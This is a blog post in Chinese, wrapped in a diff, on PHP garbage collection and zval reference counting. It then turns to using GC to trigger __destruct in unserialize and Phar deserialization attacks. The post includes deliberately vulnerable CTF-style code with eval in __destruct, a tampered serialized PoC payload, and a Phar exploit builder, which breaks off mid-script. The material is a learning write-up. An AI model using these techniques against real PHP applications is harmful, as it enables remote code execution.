@@ -1,0 +1,1034 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="且将新火试新茶，诗酒趁年华">
+    <meta name="author" content="Drunkbaby">
+    
+    <title>
+        
+            PHP GC 回收机制学习 |
+        
+        Drunkbaby&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"drun1baby.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png","favicon":"https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png","avatar":"/images/avatar.svg","font_size":"16px","font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"且将新火试新茶，诗酒趁年华","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"enable":true,"appid":"mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va","appkey":"ermlV1eoB1YODT088EdXjo6C","placeholder":"just go go","background":"/images/comment_bg.png","count":true},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Drunkbaby&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">PHP GC 回收机制学习</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Drunkbaby</span>
+                            
+                                <span class="author-label">Lv6</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2022-11-13 21:23:43</span>
+        <span class="mobile">2022-11-13 21:23</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2022-11-17 13:57:50</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3.1k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>13 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h1 id="PHP-GC-回收机制学习"><a href="#PHP-GC-回收机制学习" class="headerlink" title="PHP GC 回收机制学习"></a>PHP GC 回收机制学习</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>知识分享所见所得，自己重新再复习一遍加深印象。因为 quan 爷已经整理了一遍，我跟着学即可<br>知识分享内容地址：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16g411s7CH/">https://www.bilibili.com/video/BV16g411s7CH/</a></p>
+<h2 id="0x02-PHP-GC-回收机制是什么"><a href="#0x02-PHP-GC-回收机制是什么" class="headerlink" title="0x02 PHP GC 回收机制是什么"></a>0x02 PHP GC 回收机制是什么</h2><blockquote>
+<p>在 PHP 中，是拥有垃圾回收机制 Garbage collection 的，也就是我们常说的 GC 机制的，在 PHP 中使用引用计数和回收周期来自动管理内存对象的，当一个变量被设置为 NULL ，或者没有任何指针指向时，它就会被变成垃圾，被 GC 机制自动回收掉；那么当一个对象没有了任何引用之后，就会被回收，在回收过程中，就会自动调用对象中的 <code>__destruct()</code> 方法。</p>
+</blockquote>
+<ul>
+<li>上面这一段话我个人认为如果零基础看，会感觉到相当抽象。所以我们先来解读一下</li>
+</ul>
+<h3 id="PHP-引用计数"><a href="#PHP-引用计数" class="headerlink" title="PHP 引用计数"></a>PHP 引用计数</h3><p>当我们 PHP 创建一个变量时，这个变量会被存储在一个名为 zval 的变量容器中。在这个 zval 变量容器中，不仅包含变量的类型和值，还包含两个字节的额外信息。</p>
+<p>第一个字节名为 <code>is_ref</code>，是 bool 值，它用来标识这个变量是否是属于引用集合。PHP 引擎通过这个字节来区分普通变量和引用变量，由于 PHP 允许用户使用 <code>&amp;</code> 来使用自定义引用，zval 变量容器中还有一个内部引用计数机制，来优化内存使用。</p>
+<p>第二个字节是 <code>refcount</code>，它用来表示指向 zval 变量容器的变量个数。所有的符号存储在一个符号表中，其中每个符号都有作用域。</p>
+<p>看接下来的这个例子</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"new string"</span><span class="token punctuation">;</span> 
+<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//用于查看变量a的zval变量容器的内容</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们可以看到这里定义了一个变量 <code>$a</code>，生成了类型为 String 和值为 <code>new string</code> 的变量容器，而对于两个额外的字节，<code>is_ref</code> 和 <code>refcount</code>，我们这里可以看到是不存在引用的，所以 <code>is_ref</code> 的值应该是 false，而 <code>refcount</code> 是表示变量个数的，那么这里就应该是1，接下来我们验证一下。</p>
+<img src="/2022/11/13/PHP-GC-%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/evalRef.png" class="">
+
+<p>接下来我们添加一个引用</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token class-name type-declaration">php</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"new string"</span><span class="token punctuation">;</span> 
+<span class="token variable">$b</span> <span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span>
+<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>按照之前的思路，每生成一个变量就有一个 zval 记录其类型和值以及两个额外字节，那我们这里的话 a 的 <code>refcount</code> 应该是 1，<code>is_ref</code> 应该是 true，接下来我们验证一下</p>
+<img src="/2022/11/13/PHP-GC-%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/RefCode.png" class="">
+
+<p>哎，结果不同于我们所想的，这是为什么呢？<br>因为同一变量容器被变量 a 和变量 b 关联，当没必要时，php 不会去复制已生成的变量容器。<br>所以这一个 <code>zval</code> 容器存储了 a 和 b 两个变量，就使得 <code>refcount</code> 的值为 2</p>
+<p>接下来说一下容器的销毁这个事。<br>变量容器在 <code>refcount</code> 变成 0 时就被销毁。它这个值是如何减少的呢，当函数执行结束或者对变量调用了 <code>unset()</code> 函数，refcount 就会减 1。</p>
+<p>看个例子</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"new string"</span><span class="token punctuation">;</span> 
+<span class="token variable">$b</span> <span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span> <span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$b</span><span class="token punctuation">;</span>
+<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>按照刚刚所说，那么这里的首次输出的 <code>is_ref</code> 应该是 true，refcount 为 3。<br>第二次输出的 <code>is_ref</code> 值是什么呢，我们可以看到引用 <code>$a</code> 的变量 <code>$b</code> 和 <code>$c</code> 都被 unset 了，所以这里的 <code>is_ref</code> 应该是 false，也是因为 unset，这里的 <code>refcount</code> 应该从 3 变成了 1，接下来验证一下</p>
+<img src="/2022/11/13/PHP-GC-%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/refTrue.png" class="">
+
+<h2 id="0x03-PHP-GC-回收机制攻击面"><a href="#0x03-PHP-GC-回收机制攻击面" class="headerlink" title="0x03 PHP GC 回收机制攻击面"></a>0x03 PHP GC 回收机制攻击面</h2><ul>
+<li>原理：当 <code>is_ref</code> 减少时，会触发 <code>__destuct</code> 魔术方法，由此产生的一些 trick 类型攻击</li>
+</ul>
+<h3 id="PHP-反序列化中的-PHP-GC-利用"><a href="#PHP-反序列化中的-PHP-GC-利用" class="headerlink" title="PHP 反序列化中的 PHP GC 利用"></a>PHP 反序列化中的 PHP GC 利用</h3><p>这里的思路是，通过某些手段触发 PHP GC，这些手段都是基于 <code>is_ref</code> 被修改时发起的攻击。</p>
+<h4 id="unset-直接取消引用"><a href="#unset-直接取消引用" class="headerlink" title="unset 直接取消引用"></a>unset 直接取消引用</h4><ul>
+<li>代码如下</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span> 
+    <span class="token keyword">public</span> <span class="token variable">$num</span><span class="token punctuation">;</span> 
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">num</span> <span class="token operator">=</span> <span class="token variable">$num</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">num</span><span class="token operator">.</span><span class="token string double-quoted-string">"__construct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span> 
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">num</span><span class="token operator">.</span><span class="token string double-quoted-string">"__destruct()"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span> 
+    <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到通过 <code>unset()</code> 方法主动取消引用，可以直接调用 <code>__destruct</code> 魔术方法。</p>
+<img src="/2022/11/13/PHP-GC-%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/InvokeBefore.png" class="">
+
+<h4 id="反序列化当中取消引用"><a href="#反序列化当中取消引用" class="headerlink" title="反序列化当中取消引用"></a>反序列化当中取消引用</h4><p>可以通过 <code>unset()</code> 方法直接做引用的取消，但是一般这种情况都是不可控的，更合理的方式是修改在反序列化当中的值。</p>
+<p>这种利用方式是这样的：比如在一个 array 里面存在一个键值对，value 为某个类，当这个类为 NULL 的时候，会被认为是 <code>is_ref</code> 为 0，也就是 false。这就可以触发到 <code>__destruct</code> 方法</p>
+<ul>
+<li>照例还是结合代码讲，比如下面这一道题目，我需要去触发 <code>__destruct</code> 魔术方法</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'输入失败'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>如果按照正常的反序列化思路，是没有办法去触发 <code>__destruct</code> 的，这里就用到了我们的 PHP GC 机制，通过把 <code>is_ref</code> 修改为 false，让它触发 <code>__destruct</code></p>
+<p>PoC:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>得到序列化文本如下</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"B"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+对象类型<span class="token punctuation">:</span>长度<span class="token punctuation">:</span><span class="token punctuation">&#123;</span>类型<span class="token punctuation">:</span>长度<span class="token punctuation">;</span>类型<span class="token punctuation">:</span>长度<span class="token punctuation">:</span>类名<span class="token punctuation">:</span>值类型<span class="token punctuation">:</span>长度<span class="token punctuation">;</span>类型<span class="token punctuation">:</span>长度<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+数组<span class="token punctuation">:</span>长度为<span class="token number">2</span><span class="token operator">::</span><span class="token punctuation">&#123;</span><span class="token keyword type-declaration">int</span>型<span class="token punctuation">:</span>长度<span class="token number">0</span><span class="token punctuation">;</span>类<span class="token punctuation">:</span>长度为<span class="token number">1</span><span class="token punctuation">:</span>类名为<span class="token string double-quoted-string">"B"</span><span class="token punctuation">:</span>值为<span class="token number">0</span> <span class="token keyword type-declaration">int</span>型<span class="token punctuation">:</span>值为<span class="token number">1</span>：<span class="token keyword type-declaration">int</span>型<span class="token punctuation">;</span>值为<span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>此处对于序列化的字符串，我们先解析看一看，a 当中放了对象 B，目前 B 是有 <code>is_ref</code> 的，<code>is_ref</code> 指向了 array，所以这里我们将 <code>is_ref</code> 修改为 false 即可。</p>
+<p>如下</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"B"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/2022/11/13/PHP-GC-%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/SerializeFlag.png" class="">
+
+<p>验证成功！</p>
+<h3 id="GC-在-Phar-反序列化中的利用"><a href="#GC-在-Phar-反序列化中的利用" class="headerlink" title="GC 在 Phar 反序列化中的利用"></a>GC 在 Phar 反序列化中的利用</h3><p>差不多的原理，phar 反序列化比直接的反序列化多了签名，所以需要后续用 010 来修改一些内容，直接看例子</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span> 
+    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span> 
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+        <span class="token punctuation">&#125;</span> 
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
+<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Garbage collection"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>看到 <code>file_get_contents</code> 函数和类，就想到 Phar 反序列化，所以接下来尝试借助 <code>file_get_contents</code> 方法来进行反序列化(因为这里只是本地测试一下，所以不再设置文件上传那些，直接将生成的 Phar 文件放置本地进行利用了)。 </p>
+<p>构造 EXP 如下</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1.phar'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//后缀名必须为phar</span>
+<span class="token variable">$b</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//开始缓冲 Phar 写操作</span>
+<span class="token variable">$b</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//自定义的meta-data存入manifest</span>
+<span class="token variable">$b</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测</span>
+<span class="token variable">$b</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//添加要压缩的文件</span>
+<span class="token variable">$b</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span>
